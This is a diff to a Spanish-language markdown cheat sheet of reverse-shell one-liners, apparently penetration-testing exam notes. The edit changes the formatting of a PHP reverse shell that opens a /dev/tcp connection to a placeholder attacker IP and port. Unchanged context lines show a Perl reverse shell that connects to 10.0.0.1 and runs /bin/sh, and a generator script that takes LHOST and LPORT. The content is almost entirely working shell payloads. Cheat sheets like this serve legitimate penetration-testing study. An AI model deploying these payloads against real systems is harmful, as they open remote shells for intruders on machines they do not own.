@@ -13,10 +13,8 @@ Previamente `export PAYLOAD=<nombre-payload>; export LHOST=<IP-local>; export LP
 
 3) PHP  --> `$OSCP/explotacion/reverse-shells/php-reverse/generator.sh $LHOST $LPORT`
 
-2) PHP simplificada --> 
-<pre>
-<?php echo shell_exec("exec 97<>/dev/tcp/IP_LOCAL/PUERTO;sh <&97 >&97 2>&97; id");?>
-</pre>
+2) PHP simplificada --> `<?php echo shell_exec("exec 97<>/dev/tcp/IP_LOCAL/PUERTO;sh <&97 >&97 2>&97; id");?>`
+
 
 5) PERL --> `perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
 
